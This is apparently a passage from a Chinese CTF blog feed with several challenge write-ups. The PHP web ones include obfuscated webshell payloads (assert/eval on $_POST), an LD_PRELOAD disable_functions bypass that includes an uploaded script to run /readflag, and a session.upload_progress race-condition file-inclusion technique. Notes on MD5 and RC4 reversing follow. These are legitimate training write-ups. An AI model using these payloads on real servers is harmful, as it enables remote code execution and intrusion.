        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[无字母数字shell|ld_preload|disable_function]</p><p>以前做的题，现在再看之前写的记录，太逗乐了，当时怎么那么多迷惑操作呢</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>一开始是想着无参webshell，还写了好久的fuzz代码<br>得 没用，代码写的也不好。<br>果然花个半个多小时做不出就直接看WP<br>浪费了三个小时，离谱</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%01'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%05'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%12'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%14'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_='assert';</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%2F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%09'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $__='_POST';</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// assert($_POST[_]);</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是最低限度了，需要先把POST这几个字符拼接好</p><pre class="line-numbers language-none"><code class="language-none">?shell&#x3D;$&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);assert($$[_]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720195913492.png" alt="image-20210720195913492"></p><p>最低限度都得五六十，这40长度肯定是不行的。当时想到这就该明白了<br>可惜一直没觉悟，浪费半天时间。</p><p>2021年7月20日20:12:48 这并非最简，具体可看<a href="https://syunaht.com/p/745812677.html#toc-heading-4">https://syunaht.com/p/745812677.html#toc-heading-4</a></p><p>这题还是得URL编码取反绕过</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'(eval($_POST[cmd]))'</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'(~'</span> <span class="token operator">.</span> <span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')(~'</span> <span class="token operator">.</span> <span class="token variable">$d</span> <span class="token operator">.</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>连接蚁剑，得 无权限看flag</p><h2 id="disable-function-bypass"><a href="#disable-function-bypass" class="headerlink" title="disable_function bypass"></a>disable_function bypass</h2><blockquote><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720200020339.png" alt="image-20210720200020339"></p></blockquote><p>找个有上传权限的目录上传文件</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720200058520.png" alt="image-20210720200058520"></p><p>网上抄来的paylaod</p><pre class="line-numbers language-none"><code class="language-none">?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])等价于：?code&#x3D;$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[&#39;a&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为只有/var/tmp有上传权限，所以用<code>assert(include(&#39;/var/tmp/bypass_disablefunc.php&#39;))</code>的形式，等同于直接访问<code>bypass_disablefunc.php</code></p><pre class="line-numbers language-none"><code class="language-none">?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720200141088.png" alt="image-20210720200141088"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>重做一遍，wp重写，当时肯定偷懒了，以为懂了，其实还没懂，弄的之后再做类似的题还是没做出来。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[MRCTF2020]套娃</title>
      <link href="/p/17361915.html"/>
      <url>/p/17361915.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前做的题</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-MRCTF2020-%E5%A5%97%E5%A8%83/image-20210720193635584.png" alt="image-20210720193635584"></p><pre class="line-numbers language-none"><code class="language-none">?b+u+p+t&#x3D;23333%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-MRCTF2020-%E5%A5%97%E5%A8%83/image-20210720193722983.png" alt="image-20210720193722983"></p><p>file_get_contents配合伪协议data://使用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">re <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> j <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-MRCTF2020-%E5%A5%97%E5%A8%83/image-20210720193743881.png" alt="image-20210720193743881"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-MRCTF2020-%E5%A5%97%E5%A8%83/image-20210720193748798.png" alt="image-20210720193748798"></p><h2 id="奇文共赏"><a href="#奇文共赏" class="headerlink" title="奇文共赏"></a>奇文共赏</h2><p><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用phpinfo与文件包含进行条件竞争</title>
      <link href="/p/4200301947.html"/>
      <url>/p/4200301947.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2021年9月4日21:06:29</p><p>又做了很多类型的题，具体可见<a href="https://syunaht.com/p/2193317358.html">刷题笔记:[NPUCTF2020]ezinclude</a></p><hr><p>2021国赛做到一道，记录下</p><p>类似题：<a href="https://www.cnblogs.com/NPFS/p/13795170.html">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a></p><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><h3 id="前瞻"><a href="#前瞻" class="headerlink" title="前瞻"></a>前瞻</h3><p>需要先找到phpinfo.php =》扫目录吧<br>然后有两条路：</p><p>1.给phpinfo.php发包 <a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">示例</a><br>2.利用session。<br>国赛这里是第二条</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>利用<code>session.upload_progress</code>将木马写入<code>session</code>文件</p><p>1.session.use_strict_mode=off(默认)</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/image-20210720195058143.png" alt="image-20210720195058143"></p><p>此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值。</p><blockquote><p>在Linux系统中，session文件一般的默认存储位置为/tmp或/var/lib/php/session</p></blockquote><p>2.session.upload_progress.cleanup 默认开启<br>在默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，它就会清除进度信息。<br>所以没那么简单，需要条件竞争。</p><h2 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h2><p>POST发包代码，方便抓包</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">"http://e113b1bc-28b8-4f08-9e60-b74fe3a96ef3.chall.ctf.show/"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"POST"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"hidden"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"PHP_SESSION_UPLOAD_PROGRESS"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"123"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加一个<code>Cookie :PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>/session路径/sess_flag</code></p><p>然后两个<code>intruder</code>开起来，把函数执行的遍历目录结果存放到<code>session</code>里，然后包含出来。<br>原本<code>session</code>产生的临时文件是秒被删的，但因为条件竞争造成冲突/溢出以至于0.几秒的残余就正好被包含出来了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/image-20210720195236050.png" alt="image-20210720195236050"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/image-20210720195241924.png" alt="image-20210720195241924"></p><p>直接包含出“文件”内容</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/image-20210720195244811.png" alt="image-20210720195244811"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 条件竞争 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:BabyConst</title>
      <link href="/p/136608434.html"/>
      <url>/p/136608434.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词:[MD5|加密算法题|密码学|常见加密]</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyConst/image-20210719223358350.png" alt="image-20210719223358350"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyConst/image-20210719223402127.png" alt="image-20210719223402127"></p><p>虽然也搜出了其他加密算法……<br>姑且认为这个是MD5算法</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyConst/image-20210719223557686.png" alt="image-20210719223557686"></p><p>12个循环，一行取16个字节，正好是一个长度32的字符串，MD5解密一下，结束</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyConst/image-20210719223706958.png" alt="image-20210719223706958"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> 常见加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:BabyAlgorithm</title>
      <link href="/p/1965950118.html"/>
      <url>/p/1965950118.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词:[RC4|加密算法题|密码学|常见加密]</p><p>加密算法里有好几个mod 256 然后交换啥的，可以判断为RC4算法，具体看笔记特征值识别</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyAlgorithm/image-20210719223140957.png" alt="image-20210719223140957"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyAlgorithm/image-20210719223146411.png" alt="image-20210719223146411"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BabyAlgorithm/image-20210719223150621.png" alt="image-20210719223150621"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">46</span>v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC6</span>v8<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x21</span>v8<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCA</span>v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBF</span>v8<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x51</span>v8<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x43</span>v8<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x37</span>v8<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31</span>v8<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x75</span>v8<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE4</span>v8<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x8E</span>v8<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC0</span>v8<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x54</span>v8<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6F</span>v8<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x8F</span>v8<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xEE</span>v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF8</span>v8<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x5A</span>v8<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA2</span>v8<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC1</span>v8<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xEB</span>v8<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA5</span>v8<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x34</span>v8<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6D</span>v8<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x71</span>v8<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x55</span>v8<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8</span>v8<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7</span>v8<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xB2</span>v8<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA8</span>v8<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2F</span>v8<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xF4</span>v8<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x51</span>v8<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x8E</span>v8<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC</span>v8<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCC</span>v8<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x33</span>v8<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x53</span>v8<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31</span>v8<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x40</span>v8<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD6</span>v8<span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCA</span>v8<span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xEC</span>v8<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD4</span>inputStr_length <span class="token operator">=</span> <span class="token number">45</span>ctf233 <span class="token operator">=</span> <span class="token string">"Nu1Lctf233"</span>v3 <span class="token operator">=</span> <span class="token number">0</span>tempStr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">256</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token comment"># 先生成一个tempStr</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tempStr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>tempStr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>v3<span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ctf233<span class="token punctuation">[</span>j <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    <span class="token comment"># 然后交换两个数</span>    temp <span class="token operator">=</span> tempStr<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    tempStr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tempStr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span>    tempStr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> tempv5 <span class="token operator">=</span> <span class="token number">0</span>v6 <span class="token operator">=</span> <span class="token number">0</span>v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span>v7 <span class="token operator">&lt;</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span>v5<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v6<span class="token operator">+</span>tempStr<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    <span class="token comment"># 交换</span>    temp <span class="token operator">=</span> tempStr<span class="token punctuation">[</span>v5<span class="token punctuation">]</span>    tempStr<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> tempStr<span class="token punctuation">[</span>v6<span class="token punctuation">]</span>    tempStr<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> temp    <span class="token comment">#v8[v7] = tempStr[tempStr[v5]+tempStr[v6]] ^ flag[v7] 前面都照着算法走，最后交换律一下完事</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v8<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">^</span> tempStr<span class="token punctuation">[</span><span class="token punctuation">(</span>tempStr<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token operator">+</span>tempStr<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    v7 <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> 常见加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[DDCTF 2019]Windows_Reverse1</title>
      <link href="/p/1790846966.html"/>
      <url>/p/1790846966.html</url>
      
